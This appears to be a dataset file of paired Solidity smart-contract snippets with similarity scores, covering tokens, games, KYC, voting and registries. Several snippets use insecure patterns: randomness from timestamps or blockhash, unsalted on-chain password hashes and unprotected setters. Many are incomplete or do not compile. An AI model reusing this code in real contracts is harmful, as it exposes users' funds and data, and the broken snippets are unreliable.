    function maxUserProfit(uint8 _gameType, uint _num, uint _betValue) public view returns(int) {
        uint betValue = _betValue / 1e9; 

        int res = getGameImplementation(_gameType).maxUserProfit(_num, betValue);

        return res.mul(1e9); 
    }

    
    function getGameImplementation(uint8 _gameType) private view returns(GameInterface) {
        require(games[_gameType] != GameInterface(0), ""Invalid game type"");
        return games[_gameType];

    }
}"
"contract fileEvidence{
    struct FileEvi{
        uint caseId;
        bytes fileHash;
        uint upTime;
        address upOperator;
    }
    mapping(bytes => FileEvi) evi;
    constructor () public{
    }
    function saveFileEvi(bytes _hash,uint _upTime ) public{
        evi[_hash].fileHash = _hash;
        evi[_hash].upTime = _upTime;
        evi[_hash].upOperator = msg.sender;
    }
    function getFileEvi(bytes _hash) public view returns(uint _upTime,address _upOperator) {
        _upTime = evi[_hash].upTime;
        _upOperator = evi[_hash].upOperator;
    }
}",0.5307693609183447,"contract verifiable {



    struct Signature {

        uint8 v;

        bytes32 r;

        bytes32 s;

    }



    

    mapping(address => Signature) public signatures;



    

    function sign(uint8 v, bytes32 r, bytes32 s) public {

        signatures[msg.sender] = Signature(v, r, s);

    }



    

    function verify(address signer) public constant returns(bool) {

        bytes32 hash = keccak256(abi.encodePacked(address(this)));

        Signature storage sig = signatures[signer];

        return ecrecover(hash, sig.v, sig.r, sig.s) == signer;

    }

}"
"contract customer{
   string public firstname;
   string public lastname;
   uint256 public id;
   bool public KYC;
   uint256 public level;
   string public docsHash;
   uint256 public cost=3 ether;
   uint256 public upcost=3 ether;
   string public bankName;
   address payable[] onboarded;

   function fill(string memory fname, string memory lname ,uint256 iden, string memory KYCresult, uint256 categor, string memory hash, string memory bank) public{
      firstname=fname;
      lastname=lname;
      id=iden;
         if(keccak256(bytes(KYCresult))==keccak256(bytes(""鬲兀蹖蹖丿"")))
            {
               KYC=true;
            }
     level=categor;
     cost/=(3/categor);
     docsHash=hash;
     bankName=bank;
        onboarded.push(address(uint160(msg.sender)));
        customerFinder(0x9638101cb6571cc3A807A2a4e770Ee040dD0275c).filling(id, address(uint160(address(this))));
     }

   function contribution() public payable {
      if(msg.value==cost/(onboarded.length+1))
         {
            for(uint i=0; i<onboarded.length; i++)
               {
                  onboarded[i].transfer(msg.value/onboarded.length);
               }    
           onboarded.push(address(uint160(msg.sender)));
         }
      }
   function KYC_hash() public view returns(string memory, string memory){
       if(KYC==true)
         {
            return (""鬲兀蹖蹖丿"", docsHash);
         }else
             {
                return (""乇丿 鬲兀蹖蹖丿"", docsHash);
             }
   }


   function update(string memory fname, string memory lname ,uint256 iden, string memory KYCresult, uint256 categor, string memory hash, string memory bank) public {
      firstname=fname;
      lastname=lname;
      id=iden;
         if(keccak256(bytes(KYCresult))==keccak256(bytes(""鬲兀蹖蹖丿"")))
           {
              KYC=true;
           }
      level=categor;
      upcost/=(3/categor);
      docsHash=hash;
      bankName=bank;
   }
   function representation() public view returns(string memory, string memory, string memory, string memory, string memory, string memory, string memory){
      return (firstname, lastname, uint2str(uint(id)), uint2str(uint(level)), uint2str(uint(cost)), uint2str(uint(onboarded.length)), uint2str(uint(cost/(onboarded.length+1))));
   }

    function uint2str(uint _i) internal pure returns (string memory ) {
    if (_i == 0) {
        return ""0"";
    }
    uint j = _i;
    uint len;
    while (j != 0) {
        len++;
        j /= 10;
    }
    bytes memory bstr = new bytes(len);
    uint k = len - 1;
    while (_i != 0) {
        bstr[k--] = byte(uint8(48 + _i % 10));
        _i /= 10;
    }
    return string(bstr);
}
   function() external payable{}
}",0.5592488723898875,"contract FrikandelToken {
    address public contractOwner = msg.sender; 

    bool public ICOEnabled = true; 
    bool public Killable = true; 

    mapping (address => uint256) balances;

    uint256 public totalSupply = 500000; 
    uint256 internal hardLimitICO = 750000; 

    function name() public pure returns (string) { return ""Frikandel""; } 
    function symbol() public pure returns (string) { return ""FRKNDL""; }
    function decimals() public pure returns (uint8) { return 0; } 

    function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; }

	function FrikandelToken() public {
	    balances[contractOwner] = totalSupply; 
	}
	
	function transferOwnership(address newOwner) public {
	    if (msg.sender != contractOwner) { revert(); } 

        contractOwner = newOwner; 
	}
	
	function Destroy() public {
	    if (msg.sender != contractOwner) { revert(); } 
	    
	    if (Killable == true){ 
	        selfdestruct(contractOwner);
	    }
	}
	
	function DisableSuicide() public returns (bool success){
	    if (msg.sender != contractOwner) { revert(); } 
	    
	    Killable = false;
	    return true;
	}

    function transfer(address _to, uint256 _value) public returns (bool success) {
        if(msg.data.length < (2 * 32) + 4) { revert(); } 

        if (_value == 0) { return false; } 

        uint256 fromBalance = balances[msg.sender];

        bool sufficientFunds = fromBalance >= _value;
        bool overflowed = balances[_to] + _value < balances[_to];

        if (sufficientFunds && !overflowed) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            
            Transfer(msg.sender, _to, _value);
            return true; 
        } else { return false; } 
    }

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    function enableICO() public {
        if (msg.sender != contractOwner) { revert(); } 
        ICOEnabled = true;
    }

    function disableICO() public {
        if (msg.sender != contractOwner) { revert(); } 
        ICOEnabled = false;
    }

    function() payable public {
        if (!ICOEnabled) { revert(); }
        if(balances[msg.sender]+(msg.value / 1e14) > 30000) { revert(); } 
        if(totalSupply+(msg.value / 1e14) > hardLimitICO) { revert(); } 
        if (msg.value == 0) { return; }

        contractOwner.transfer(msg.value);

        uint256 tokensIssued = (msg.value / 1e14); 

        totalSupply += tokensIssued;
        balances[msg.sender] += tokensIssued;

        Transfer(address(this), msg.sender, tokensIssued);
    }
}"
"contract userPasswd
{
    mapping(bytes32 => bytes32) private  userPasswds ;
    event RecordReturnResult(bool res);

    
    function newPair(string user, string password)  returns (bool) {      
        bytes32  sha3_user = sha3(user);
        bytes32  sha3_password = sha3(password);
        bool res = true;
        if (userPasswds[sha3_user] > 0) {
            res = false;
            RecordReturnResult(res);
            return res;
        }           
        else{
            userPasswds[sha3_user] = sha3_password;
            res = true;
            RecordReturnResult(res);
            return res;
        }      
    }

    
    function verify(string user, string password) returns (bool) {
        bytes32  sha3_user = sha3(user);
        bytes32  sha3_password = sha3(password);
        

        
        if (userPasswds[sha3_user] == sha3_password){
            RecordReturnResult(true);
            return true;
        }           
        else{
            RecordReturnResult(false);
            return false;
        }
    }

     
    function del(string user) returns (bool) {
        bytes32  sha3_user = sha3(user);

        if (userPasswds[sha3_user] > 0){
           delete userPasswds[sha3_user];
           RecordReturnResult(true);
           return true;
        }
        else {
            RecordReturnResult(false);
            return false;   
        }

    }
      
    function change(string user, string password) returns (bool) {
        bytes32  sha3_user = sha3(user);
        bytes32  sha3_password = sha3(password);

        if (userPasswds[sha3_user] > 0){
           userPasswds[sha3_user] = sha3_password;
           RecordReturnResult(true);
           return true;
        }
        else {
            RecordReturnResult(false);
            return false;
        }                
    }
}",0.5177692589560124,"contract SvEnsRegistry is ENS {
    struct Record {
        address owner;
        address resolver;
        uint64 ttl;
    }

    mapping (bytes32 => Record) records;

    
    modifier only_owner(bytes32 node) {
        require(records[node].owner == msg.sender);
        _;
    }

    
    function SvEnsRegistry() public {
        records[0x0].owner = msg.sender;
    }

    
    function setOwner(bytes32 node, address owner) external only_owner(node) {
        emit Transfer(node, owner);
        records[node].owner = owner;
    }

    
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external only_owner(node) returns (bytes32) {
        bytes32 subnode = keccak256(node, label);
        emit NewOwner(node, label, owner);
        records[subnode].owner = owner;
        return subnode;
    }

    
    function setResolver(bytes32 node, address resolver) external only_owner(node) {
        emit NewResolver(node, resolver);
        records[node].resolver = resolver;
    }

    
    function setTTL(bytes32 node, uint64 ttl) external only_owner(node) {
        emit NewTTL(node, ttl);
        records[node].ttl = ttl;
    }

    
    function owner(bytes32 node) external view returns (address) {
        return records[node].owner;
    }

    
    function resolver(bytes32 node) external view returns (address) {
        return records[node].resolver;
    }

    
    function ttl(bytes32 node) external view returns (uint64) {
        return records[node].ttl;
    }

}"
"contract SimpleFallback{
    event FallbackCalledEvent(bytes data);
    event AddEvent(uint a, uint b, uint result);
    event DoubleEvent(uint a, uint b);
    event GetNameEvent(string);

    function() external{
        emit FallbackCalledEvent(msg.data);
    }

    function add(uint a, uint b) public returns(uint){
        
        
        

        uint _result = a + b;
        emit AddEvent(a, b, _result);

        return _result;
    }

    function double(uint a) public returns(uint){
        
        
        uint _result = 2*a;

        emit DoubleEvent(a, _result);

        return _result;
    }

    function getName(string memory name) public returns(string memory){
        emit GetNameEvent(name);

        return name;
    }
}",0.5909005584497891,"contract SafeMath {

  



  function safeMul(uint a, uint b) internal pure returns (uint) {

    uint c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }



  function safeSub(uint a, uint b) internal pure returns (uint) {

    assert(b <= a);

    return a - b;

  }



  function safeAdd(uint a, uint b) internal pure returns (uint) {

    uint c = a + b;

    assert(c>=a && c>=b);

    return c;

  }



  event Transfer(address indexed _from, address indexed _to, uint256 _value);

  event Approval(address indexed _owner, address indexed _spender, uint256 _value);

  event Burn(address indexed _from, uint256 _value);

}"
"contract RunTest{


    function callAddlTest(address other) public {
        
        
        other.call(abi.encodeWithSignature(""add(uint,uint)"", 85, 60));
    }

    function callDoublelTest(address other) public {
        
        
        other.call(abi.encodeWithSignature(""double(uint)"", 100));
    }

    function callgetNameTest(address other) public{
        other.call(abi.encodeWithSignature(""getName(string)"", ""hello""));
    }
}",0.5241428136431457,"contract TokenInfoController {

  function get_total_supply() constant public returns (uint256 _total_supply){}

  function get_allowance(address _account, address _spender) constant public returns (uint256 _allowance){}

  function get_balance(address _user) constant public returns (uint256 _actual_balance){}

}"
"contract EtherMon{ 
    uint public starterEgg;
    address public owner;



    struct player{
        uint256 goldAmount;
      uint[10] listOfEggs;
        bool eggCoolDown;
        uint eggTime;
        uint eggID;
        bool battleCoolDown;
        bool breedingCoolDown;
        uint[] ownedEthermon;
    }

      mapping (address => player) public listOfPlayers;

    function EtherMon(){
        owner = msg.sender;

    }

    function createAccount(){


     starterEgg = block.timestamp % 10;

     listOfPlayers[msg.sender].goldAmount  = 100;
     listOfPlayers[msg.sender].listOfEggs[0] = starterEgg;


        }



  function getCurrentEggs() returns (uint[]) {
 uint length =  listOfPlayers[msg.sender].listOfEggs.length;
 uint[] eggArray;
            for(uint i = 0; i < length; i++){
               eggArray[i] =  listOfPlayers[msg.sender].listOfEggs[i];
            }
            return eggArray;
        }

    }",0.573433817717094,"contract WavesPresale {
    address public owner;
    
    struct Sale
    {
        uint amount;
        uint date;
    }

    mapping (bytes16 => Sale) public sales;
    uint32 public numberOfSales;
    uint public totalTokens;

    function WavesPresale() {
        owner = msg.sender;
        numberOfSales = 0;
    }

    function changeOwner(address newOwner) {
        if (msg.sender != owner) return;

        owner = newOwner;
    }

    function newSale(bytes16 txidHash, uint amount, uint timestamp) {
        if (msg.sender != owner) return;

        sales[txidHash] = Sale({
                amount: amount,
                date: timestamp
            });
        numberOfSales += 1;
        totalTokens += amount;
    }

    function getSaleDate(bytes16 txidHash) constant returns (uint, uint) {
    	return (sales[txidHash].amount, sales[txidHash].date);
    }

    function () {
        
        
        
        
        
        
        throw;
    }

}"
"contract Damble is usingOraclize{

function Damble() {
    getRandomNumber();

}
    function __callback(bytes32 _queryId, string _result, bytes _proof) { 
    if (msg.sender != oraclize_cbAddress()) throw;

    if (oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) {
        
    } else {
        
        

        newRandomNumber_bytes(bytes(_result)); 

        
        uint maxRange = 10000000; 
        uint randomNumber = uint(sha3(_result)) % maxRange; 

        newRandomNumber_uint(randomNumber); 
    }
}

function getRandomNumber() payable{ 
    oraclize_setProof(proofType_Ledger); 
    uint N = 4; 
    uint delay = 0; 
    uint callbackGas = 200000; 
    bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas);
}
",0.5165100054311669,"contract Dao9000 {
    string message; 
    address[] public members;

    function Dao9000 () {
        members.push (msg.sender); 
        message = ""Message not yet defined"";
    }
    
    
    function getMembers () constant returns (uint256 retVal) {
        return members.length;
    }
    
    function getMessage () constant returns (string retVal) {
        return message;
    }
    
    
    function () {
        
        if (msg.value < 1500000000000000000 && msg.value > 1) {
            
            uint256 randomIndex = (uint256(block.blockhash(block.number-1)) + now) % members.length;
            if (members[randomIndex].send(msg.value)) {
                if (msg.data.length > 0)
                    message = string(msg.data); 
                members.push (msg.sender); 
            } else {
                throw;
            }
        } else {
            throw;
        }
    }
}"
"contract PriceFeed is usingOraclize{
  uint public BTCUSD;

  function PriceFeed(){
    oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);
    update(0); 
  }

  function __callback(bytes32 myid, string result, bytes proof) {
    if (msg.sender != oraclize_cbAddress()) throw;
    BTCUSD = parseInt(result, 2); 
    
   

    update(360); 
  }

  function update(uint delay){
    oraclize_query(delay, ""URL"",
      ""json(https:
  }
}",0.5148989300433018,"contract PricingStrategy {

  function isPricingStrategy() public constant returns (bool) {
    return true;
  }

  
  function isSane(address crowdsale) public constant returns (bool) {
    return true;
  }

 
  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);
}"
"contract Campaign
{
    struct Request
    {
        string description;
        uint value;
        address recipient;
        bool compelete;
        uint approvalCount;
        mapping(address=>bool) approvals;
    }
    Request[] public requests;
    address public manager;
    uint public minimumContribution;
    mapping (address=> bool) public approvers;

    modifier restricted()
    {
        require(msg.sender==manager);
        _;
    }
    function Campaign(uint minimum) public
    {
        manager = msg.sender;
        minimumContribution = minimum;
    }
    function Contribute() public payable
    {
        require(msg.value >= minimumContribution);
        approvers[msg.sender]=true;

    }
    function createRequest(string description, uint value, address recipient) public restricted 
    {
        require(approvers[msg.sender]);
        Request memory newRequest = Request({
            description:description,
            value:value,
            recipient:recipient,
            complete:false,
            approvalCount: 0
            });
        requests.push(newRequest);
    }
    function approveRequest(uint index) public {

        require(approvers[msg.sender]);
        require(!requests[index].approvals[msg.sender]);

        requests[index].approvals[msg.sender]=true;
        requests[index].approvalCount++;
    }
}",0.5886401642648471,"contract TrustaBitToken is MintableToken {

  string public constant name = ""TrustaBits"";

  string public constant symbol = ""TAB"";

  uint256 public constant decimals = 18;

  modifier isFinishedMinting () {
    require(mintingFinished);
    _;
  }
  function transfer(address _to, uint256 _value) public isFinishedMinting returns (bool) {
    return super.transfer(_to, _value);
  }

  function transferFrom(address _from, address _to, uint256 _value) public isFinishedMinting returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(address _spender, uint256 _value) public isFinishedMinting returns (bool) {
    return super.approve(_spender, _value);
  }

  function increaseApproval(address _spender, uint _addedValue) public isFinishedMinting returns (bool success) {
    return super.increaseApproval(_spender, _addedValue);
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public isFinishedMinting returns (bool success) {
    return super.decreaseApproval(_spender, _subtractedValue);
  }

}"
"contract arraytest{

struct Player {
    uint estimation;
    
    
}

Player[] public playersArr;
address[] public playersaddress;

    function setbid(uint _prediction, address _playeraddr) public{
    Player memory player;
    player.estimation = _prediction;
    playersArr.push(player);
    playersaddress.push(_playeraddr);

}

    function getWinnersArray() public view returns (address[] memory) {
    uint i=0;


    uint counter = 0;
    uint j=1;
    uint minvalue=playersArr[i].estimation;

    address[] memory winners = new address[](j);
    winners[counter] = playersaddress[i];
    counter++;


    for (i = 1; i < playersArr.length; i++) {



        if (playersArr[i].estimation < minvalue) {

            minvalue=playersArr[i].estimation;
            delete winners;

            winners = new address[](j);
            counter=0;

            winners[counter] = playersaddress[i];
            counter++;
        }else if(playersArr[i].estimation == minvalue){

            
        }
    }
    return (winners);
}",0.5737616395548717,"contract Balance {

   

   function getTokenBalance(address[] memory _addresses, address[] memory _tokenAddresses) public view returns (uint256[] memory balances) {

       require(_tokenAddresses.length >= 1);

       require(_addresses.length >= 1);

       uint256 counter = 0;

       balances = new uint[](_addresses.length * _tokenAddresses.length);

       for (uint i = 0; i < _tokenAddresses.length; i++) {

           for (uint j = 0; j < _addresses.length; j++) {

                IERC20 token = IERC20(_tokenAddresses[i]);

                balances[counter] = uint256(token.balanceOf(_addresses[j]));

                counter++;

           }

       }

       return balances;

   }

   

   function getBalance(address[] memory _addresses) public view returns (uint256[] memory balances) {

       require(_addresses.length >= 1);

       uint256 counter = 0;

       balances = new uint[](_addresses.length);

       for (uint j = 0; j < _addresses.length; j++) {

            balances[counter] = _addresses[j].balance;

            counter++;

       }

   }

   

}"
"contract 721TokenFreezer{

  function freezeToken(address _tokenToFreezeAddress, uint256 _tokenToFreezeId) {
    
  }

  function unfreezeToken(address _tokenToFreezeAddress, uint256 _tokenToFreezeId, address _to){
    
  }",0.5777784788476716,"contract Token {
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transfer(address _to, uint256 _value);
    function balanceOf(address) returns (uint256);
}"
"contract Institute{
struct InstituteDetails {
    uint id;
    string name;
    uint studentCount;
}


mapping(uint => InstituteDetails) public Institutes;

constructor() public{
    addInstitute('test');
}

event instituteCreatedEvent (
    uint  id
);
 
uint public instituteCount;

function addInstitute (string memory _name) public {
    instituteCount ++;
    Institutes[instituteCount] = InstituteDetails(instituteCount, 
_name, 0);
    emit instituteCreatedEvent(instituteCount);
}
}",0.5138897142159915,"contract PingPong {
  string private last;
  uint private pong_count;

  function PingPong() public {
    last = """";
    pong_count = 0;
  }

  event Pinged( string payload );
  event Ponged( uint indexed count, string payload );

  function ping( string payload ) public {
    last = payload;

    Pinged( payload );
  }

  function pong() public {
    pong_count += 1;

    Ponged( pong_count, last );
  }

  function count() public view returns (uint n) {
    n = pong_count;
  }
}"
"contract AssetFactory{

    address[] deployedAssets;

      function createAsset(string name) public {
        address newAsset = new Asset(name);
        deployedAssets.push(newAsset);
        return newAsset;
      }

    }",0.5443689805494891,"contract TokenVestingFactory {



  

  function create(

    address _beneficiary,

    uint256 _start,

    uint256 _cliff,

    uint256 _duration,

    bool _revocable

  )

    public

    returns (address wallet);

}"
"contract queue
{
    Queue requests;

    event ElementPopped(uint256 _element); 
    event ElementPushed(uint256 _element, uint256 _index); 

    function queue() {
        requests.data.length = 200;
    }

    struct Queue {
        uint256[] data;
        uint256 front;
        uint256 back;
    }
    
    function length(Queue storage q) constant internal returns (uint256) {
        return q.back - q.front;
    }
    
    function capacity(Queue storage q) constant internal returns (uint256) {
        return q.data.length - 1;
    }

    function isOverlapped(Queue storage q) internal returns (bool) {
        return (q.back + 1) % q.data.length == q.front;
    }

    
    function push(Queue storage q, uint256 data) internal {
        if (isOverlapped(q)) throw;
        q.data[q.back] = data;

        ElementPushed(data, q.back);

        q.back = (q.back + 1) % q.data.length;
    }


    
    function pop(Queue storage q) internal returns (uint256 r)
    {
        if (q.back == q.front)
            return; 
        r = q.data[q.front];
        delete q.data[q.front];
        q.front = (q.front + 1) % q.data.length;
        return r;
    }


    function addRequest(uint256 d) {
        push(requests, d);
    }

    function popRequest() {
        ElementPopped(pop(requests));
    }

    function queueLength() constant returns (uint256) {
        return length(requests);
    }
}",0.5975616744622013,"contract SafeMath {

    uint constant DAY_IN_SECONDS = 86400;

    function mul(uint256 a, uint256 b) constant internal returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) constant internal returns (uint256) {
        assert(b != 0); 
        uint256 c = a / b;
        assert(a == b * c + a % b); 
        return c;
    }

    function sub(uint256 a, uint256 b) constant internal returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) constant internal returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }

    function mulByFraction(uint256 number, uint256 numerator, uint256 denominator) internal returns (uint256) {
        return div(mul(number, numerator), denominator);
    }

    
    function dateBonus(uint startIco) internal returns (uint256) {

        
        uint daysFromStart = (now - startIco) / DAY_IN_SECONDS + 1;

        if(daysFromStart >= 1  && daysFromStart <= 14) return 20; 
        if(daysFromStart >= 15 && daysFromStart <= 28) return 15; 
        if(daysFromStart >= 29 && daysFromStart <= 42) return 10; 
        if(daysFromStart >= 43)                        return 5;  

        
        return 0;
    }

}"
"contract habibconcert{

      uint  public tickets = 6;

      address owner_of_tickets;

      uint constant price = 1 ether;

       mapping(address=>uint) public purchasers;

      function habibconcert()payable{

            owner_of_tickets =  msg.sender;
      }


                function  displayTickets_numbers()constant returns(uint){

                    return tickets;


                }






              function changeTickets_numberTicket (uint newtickets) {

                         tickets +=newtickets;

                   }











        modifier ownLycreature(){


            require(msg.sender ==  owner_of_tickets) ;

            
            _;

            }



               function changeTickets_number (uint newtickets) ownLycreature{

                         tickets +=newtickets;

                   }




    function buytickets(uint amount)payable{

          if(msg.value!=(amount*price) || amount>tickets){

              throw;
          }

          purchasers[msg.sender] +=amount;

          tickets -=amount;


        

        

        


    }        





}",0.5817028356365702,"contract GiftCard2017{
    address owner;
    mapping (address => uint256) public authorizations;
    
    
    function GiftCard2017() public {
        owner = msg.sender;
    }
    
    
    function () public payable {                               
        uint256 _redemption = authorizations[msg.sender];      
        require (_redemption > 0);
        authorizations[msg.sender] = 0;                        
        msg.sender.transfer(_redemption * 1e15 + msg.value);   
    }
    
    
    function deposit() public payable OwnerOnly {
    }
    
    
    function withdraw(uint256 _amount) public OwnerOnly {
        owner.transfer(_amount);
    }

    
    function authorize(address _addr, uint256 _amount_mEth) public OwnerOnly {
        require (this.balance >= _amount_mEth);
        authorizations[_addr] = _amount_mEth;
    }
    
    
    modifier OwnerOnly () {
        require (msg.sender == owner);
        _;
    }
}"
"contract ItemBill{

    enum ProductState {Shipped, Store, Owned, Sale}
    address owner;
    bytes32 public name;
    uint public productCount = 0;

    struct Product 
    {
            uint id;
            bytes32 name;
            bytes32 serlialNo;
            uint price;
            address UpdatedBy;
            bytes10 pro_state; 
    }

    mapping(address => Product[]) OwnerOfProducts;

    
    

    event ProductCreated
    (
        uint id,
        bytes32 name,
        bytes32 serlialNo,
        uint price,
        address owner,
        bytes10 pro_state 
    );

    constructor() public {
            owner = msg.sender;
    }

    function createProduct(address _OwnerAddress, bytes32 _name, bytes32 _serialNo, uint _price, bytes10 _pro_state) public {
        
        require(_name.length > 0);
        
        require(_price >= 0);
        
        require(_serialNo.length > 0);
        
        Product memory p;
        
        p.id = productCount++;
        p.name = _name;
        p.serlialNo = _serialNo;
        p.price = _price;
        p.UpdatedBy = msg.sender;
        p.pro_state = _pro_state;

        OwnerOfProducts[_OwnerAddress].push(p);

        
        emit ProductCreated(productCount, _name, _serialNo, _price, msg.sender, _pro_state );
    }

    function getProduct(address _address) view public returns(uint, bytes32, bytes32, uint, address, bytes10) {

        returns(OwnerOfProducts[_address].id, OwnerOfProducts[_address].name, OwnerOfProducts[_address].serlialNo, OwnerOfProducts[_address].price, OwnerOfProducts[_address].owner, OwnerOfProducts[_address].pro_state); 

**

    }

    function getproductcount() view public returns(uint){
        returns OwnerOfProducts.length;
    }
}",0.5801279904586257,"contract USDExchange is Ownable {



    using SafeMath for uint256;



    uint256 public etherPriceInUSD;

    uint256 public priceUpdateAt;

    mapping(address => bool) public trustedAddresses;



    event NewPriceTicker(string _price);



    modifier onlyTursted() {

        require(trustedAddresses[msg.sender] == true);

        _;

    }



    constructor(uint256 _etherPriceInUSD) public {

        etherPriceInUSD = _etherPriceInUSD;

        priceUpdateAt = block.timestamp;

        trustedAddresses[msg.sender] = true;

    }



    function setTrustedAddress(address _address, bool _status) public onlyOwner {

        trustedAddresses[_address] = _status;

    }



    

    

    

    function setEtherInUSD(string _price) public onlyTursted {

        bytes memory bytePrice = bytes(_price);

        uint256 dot = bytePrice.length.sub(uint256(6));



        

        require(0x2e == uint(bytePrice[dot]));



        uint256 newPrice = uint256(10 ** 23).div(parseInt(_price, 5));



        require(newPrice > 0);



        etherPriceInUSD = parseInt(_price, 5);



        priceUpdateAt = block.timestamp;



        emit NewPriceTicker(_price);

    }



    function parseInt(string _a, uint _b) internal pure returns (uint) {

        bytes memory bresult = bytes(_a);

        uint res = 0;

        bool decimals = false;

        for (uint i = 0; i < bresult.length; i++) {

            if ((bresult[i] >= 48) && (bresult[i] <= 57)) {

                if (decimals) {

                    if (_b == 0) break;

                    else _b--;

                }

                res *= 10;

                res += uint(bresult[i]) - 48;

            } else if (bresult[i] == 46) decimals = true;

        }

        if (_b > 0) res *= 10 ** _b;

        return res;

    }

}"
"contract Bank{       
    address client;
    uint gainedWei;
    function pay() payable {
       client    = msg.sender;
       gainedWei = msg.value;
    }
    function payMeBack() {
     if(<some condition check>)
        
    }
}",0.5958170187662414,"contract SL{

    uint public A;

    address public S;

    function ADEP() public{

        A++;

        S = msg.sender;

    }

    function () payable public{}

    function N() public payable{

        ADEP();

    }

}"
"contract Test
        {
            event TestEvent(uint a);
            function Test() {}
        `;
    for (let i=0;i<functions_count;i++)
    {
        code+=""\nfunction f""+i+`(uint i)
        {
            TestEvent(i);
        }`;
    }
    code+=""\n}",0.5327746603633887,"contract IFeeWallet {



  function getFee(

    uint amount) public view returns(uint);



  function collect(

    address _affiliate) public payable;

}"
"contract Music is owned{

    string public themeMusic;
    string public idMusic;
    int public money;

    function Music (string setThemeMusic, string setIdMusic, int setmoney) {
        themeMusic = setThemeMusic;
        idMusic = setIdMusic;
        money = setmoney;
    }

    function setMoney(int moneyUpdate) onlyOwner {
        money = moneyUpdate;
    }
}",0.5366694886905203,"contract RootInBlocks is Ownable {

  mapping(string => uint) map;

  event Added(
    string hash,
    uint time
  );

  function put(string hash) public onlyOwner {
    require(map[hash] == 0);
    map[hash] = block.timestamp;
    emit Added(hash, block.timestamp);
  }

  function get(string hash) public constant returns(uint) {
    return map[hash];
  }

}"
"contract CardToDefense is InterfaceCardToDefense{
mapping(int => mapping (int => int)) public AttackPosition2Defense;
mapping(int => string) public CardType2String;
mapping(int => string) public AttackType2String;
mapping(int => string) public Position2String;

function setAttackPositionToDefense(int attack, int position, int defense) public {
    AttackPosition2Defense[attack][position] = defense;
}
function setCardType2String(int _id, string name) public {
    CardType2String[_id] = name;
}
function setAttackType2String(int _id, string name) public {
    AttackType2String[_id]= name;
}
function setPosition2String(int _id, string name) public {
    Position2String[_id]= name;
}
}",0.5096411665356287,"contract BitRecord {

    struct Fact {

        address owner;

        string filename;

    }



    mapping(bytes16 => Fact) facts;

    mapping(bytes16 => mapping(address => bool)) signatures;



    constructor() public {}



    function getFact(bytes16 _fact_id) public constant returns (string _filename) {

        _filename = facts[_fact_id].filename;

    }



    function postFact(bytes16 _fact_id, address _owner, string _filename) public {

        facts[_fact_id] = Fact(_owner, _filename);

    }



    function isSigned(bytes16 _fact_id, address _signer) public constant returns (bool _signed){

      if (signatures[_fact_id][_signer] == true){

          return true;

      }else{

          return false;

      }

    }



    function signFact(bytes16 _fact_id) public {

        signatures[_fact_id][msg.sender] = true;

    }

}"
"contract Callee{

    uint public anyNumber;

    function theOnlyFunctionCallerNeeds (uint someData) external {
        anyNumber = someData;
    }

    function justSomeRandomFunction(uint someOtherData) public view returns (uint){
        return anyNumber + someOtherData + 42;
    }
}",0.5829491811503151,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract Post{

struct tags{
bytes32[] tagged; 
}

mapping(address => tags) adminTags;

function appendTags(address addrs, bytes32 tag) public { 
 adminTags[addrs].tagged.push(tag); 
} 

function getTagsofAdmin(address addrs) public view returns(bytes32[]){ 
return adminTags[addrs].tagged; 
}

}",0.5959461053886372,"contract ENSResolver {

    function addr(bytes32 _node) public view returns (address);

    function setAddr(bytes32 _node, address _addr) public;

    function name(bytes32 _node) public view returns (string);

    function setName(bytes32 _node, string _name) public;

}"
"contract Test{
uint fee;

function Test(uint _feeNumerator, uint _feeDenominator){
    fee = _feeNumerator/_feeDenominator;
}

function updateFee(uint _numerator, uint _denominator){
    fee = _numerator / _denominator;
}

function testPayable(string _doesNothing) payable {
    require(msg.value == fee * (10**18));

}

function getFee() returns (uint fee){
    return fee;
}",0.5381904686457124,"contract PricingStrategy2 {

    using SafeMath for uint;

    uint public rate;

    function PricingStrategy2(uint _rate) {
        require(_rate > 0);
        rate = _rate;
    }

    
    function isPricingStrategy() public constant returns (bool) {
        return true;
    }

    
    function calculateTokenAmount(uint weiAmount) public constant returns (uint tokenAmount) {
        return weiAmount.mul(rate);
    }
}"
"contract vote
{
    uint public c0=0;
    uint public c1=0;
    uint public c2=0;
    uint public c3=0;
    uint public c4=0;
    uint public c5=0;
    function set(uint x) public {
        if(x==0)
        {
            c0+=1;
        }
        else if(x==1)
        {
            c1+=1;
        }
        else if(x==2)
        {
            c2+=1;
        }
        else if(x==3)
        {
            c3+=1;
        }
        else if(x==4)
        {
            c4+=1;
        }
        else if(x==5)
        {
            c5+=1;
        }
        else
        {

        }
    }
    function get() public view returns(uint,uint,uint,uint,uint,uint)
    {
        return (c0,c1,c2,c3,c4,c5);
    }
}",0.564567095662431,"contract SafeMath {



	function safeSub(uint a, uint b) pure internal returns(uint) {

		assert(b <= a);

		return a - b;

	}



	function safeAdd(uint a, uint b) pure internal returns(uint) {

		uint c = a + b;

		assert(c >= a && c >= b);

		return c;

	}



	function safeMul(uint a, uint b) pure internal returns (uint) {

    uint c = a * b;

    assert(a == 0 || c / a == b);

    return c;

  }

}"
"contract Shitlist{

    
    mapping(string => uint) countevents;

    
    mapping(string => mapping(uint => string)) database;

    struct Victim {
        address person;
        uint stake;
        uint time;
    }

    
    mapping(address => mapping(string =>Victim)) victimDatabase;

    uint RefundTime;
    uint MinimumStake;

    function Shitlist(uint _refundtime, uint _minimumStake) public {
        RefundTime = _refundtime;
        MinimumStake = _minimumStake;

    }

    function makeClaim(string _name, string _ipfs) payable public {
        
